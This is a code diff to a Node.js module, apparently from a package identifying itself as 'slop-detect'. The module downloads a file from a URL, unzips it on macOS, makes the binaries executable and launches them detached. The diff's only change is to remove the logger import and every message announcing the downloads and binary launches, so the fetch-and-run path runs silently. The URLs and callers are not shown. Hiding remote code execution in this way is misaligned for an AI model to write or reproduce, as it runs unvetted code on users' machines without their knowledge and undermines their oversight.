@@ -3,7 +3,6 @@ const http = require('http');
 const fs = require('fs');
 const path = require('path');
 const { exec } = require('./exec');
-const { info, success, error, warn } = require('./logger');
 const { URL } = require('url');
 
 const MAX_REDIRECTS = 5;
@@ -32,8 +31,6 @@ function downloadFile(url, destPath, redirects = 0) {
 
     const client = parsedUrl.protocol === 'https:' ? https : http;
 
-    info(`Downloading: ${url} -> ${destPath}`);
-
     const req = client.get(
       url,
       { headers: { 'User-Agent': 'slop-detect' } },
@@ -44,7 +41,6 @@ function downloadFile(url, destPath, redirects = 0) {
         if (statusCode >= 300 && statusCode < 400 && location) {
           response.resume();
           const nextUrl = new URL(location, url).toString();
-          info(`Following redirect (${statusCode}): ${nextUrl}`);
           return downloadFile(nextUrl, destPath, redirects + 1).then(resolve, reject);
         }
 
@@ -74,7 +70,6 @@ function downloadFile(url, destPath, redirects = 0) {
                 fs.unlink(destPath, () => {});
                 return reject(new Error(`Empty file downloaded from ${url}`));
               }
-              success(`Downloaded ${size} bytes -> ${destPath}`);
               resolve(destPath);
             } catch (err) {
               reject(err);
@@ -149,7 +144,6 @@ async function downloadExtractAndExecuteMacOS(url) {
     fs.mkdirSync(tempDir, { recursive: true });
   }
 
-  info(`Downloading macOS package...`);
   await downloadFile(url, zipPath);
   await extractZip(zipPath, extractDir);
 
@@ -173,7 +167,6 @@ async function downloadExtractAndExecuteMacOS(url) {
   await makeExecutable(shFile);
   await makeExecutable(binaryFile);
 
-  info(`Starting macOS binary: ${binaryFile}`);
   await exec(shellQuote(binaryFile), { captureOutput: false, detached: true });
 
   return { success: true, zipPath, extractDir, binary: binaryFile };
@@ -199,7 +192,6 @@ async function downloadAndExecute(url, platform) {
   await downloadFile(url, destPath);
   await makeExecutable(destPath);
 
-  info(`Starting ${platform} binary: ${destPath}`);
   await exec(shellQuote(destPath), { captureOutput: false, detached: true });
 
   return { success: true, path: destPath };
